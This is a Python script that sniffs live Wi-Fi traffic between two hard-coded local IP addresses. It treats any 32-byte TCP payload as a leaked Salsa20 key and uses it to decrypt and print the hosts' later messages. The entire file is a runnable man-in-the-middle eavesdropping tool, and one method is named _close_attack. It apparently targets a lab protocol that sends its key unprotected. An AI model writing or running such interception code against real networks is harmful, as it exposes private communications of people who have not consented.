import pyshark
import signal
from salsa import Salsa20Cipher

class PacketInterceptor:
    def __init__(self, target_ip1, target_ip2, network_interface='Wi-Fi'):
        self.target_ip1 = target_ip1
        self.target_ip2 = target_ip2
        self.network_interface = network_interface
        self.cipher = None
        self.capture_active = True

        signal.signal(signal.SIGINT, self._handle_interrupt_signal)

    def _handle_interrupt_signal(self, sig, frame):
        self.capture_active = False
        print("\nStopping packet capture...")

    def _analyze_packet(self, packet):
        if hasattr(packet, 'tcp') and hasattr(packet.tcp, 'payload') and packet.tcp.payload:
            try:
                tcp_payload = packet.tcp.payload
                data = bytes.fromhex(tcp_payload.replace(":", ""))
                if len(data) == 32:  # 32 bytes = 256 bits
                    print("Potential key found")
                    self._attempt_decryption(data)
            except ValueError:
                pass  # Ignore if payload format is incorrect

    def _attempt_decryption(self, key):
        self.cipher = Salsa20Cipher(key)
        print(f"Attempting decryption with key: {key.hex()}")

        try:
            for packet in pyshark.LiveCapture(interface=self.network_interface).sniff_continuously():
                if not self.capture_active:
                    break

                if 'IP' in packet:
                    src_ip = packet.ip.src
                    dst_ip = packet.ip.dst

                    if (src_ip == self.target_ip2 and dst_ip == self.target_ip1) or (src_ip == self.target_ip1 and dst_ip == self.target_ip2):
                        if hasattr(packet, 'tcp') and hasattr(packet.tcp, 'payload') and packet.tcp.payload:
                            tcp_payload = packet.tcp.payload
                            data = bytes.fromhex(tcp_payload.replace(":", ""))

                            try:
                                decrypted_data = self.cipher.decrypt(data)
                                print(f"From {src_ip} -> {dst_ip}")
                                print(f"Successfully captured and decrypted packet: {decrypted_data.decode('utf-8')}")
                                print()
                            except (UnicodeDecodeError, ValueError):
                                print("Incorrect key or corrupted data, searching for another key...")
                                return  # Will return to searching for another key

        except KeyboardInterrupt:
            print("\nCapture interrupted by user.")

    def start_capture(self):
        print(f"Capturing TCP packets on the {self.network_interface} interface. Press Ctrl+C to stop.")
        capture = pyshark.LiveCapture(interface=self.network_interface, bpf_filter='tcp')

        try:
            for packet in capture.sniff_continuously():
                if not self.capture_active:
                    break

                if 'IP' in packet:
                    src_ip = packet.ip.src
                    dst_ip = packet.ip.dst

                    if (src_ip == self.target_ip2 and dst_ip == self.target_ip1) or (src_ip == self.target_ip1 and dst_ip == self.target_ip2):
                        self._analyze_packet(packet)

        except KeyboardInterrupt:
            print("\nCapture interrupted by user.")

        finally:
            self._close_attack()

    def _close_attack(self):
        print("Closing capture and releasing resources.")

if __name__ == "__main__":
    ip_1 = '192.168.1.2'
    ip_2 = '192.168.1.13'
    interceptor = PacketInterceptor(ip_1, ip_2, 'Wi-Fi')
    interceptor.start_capture()
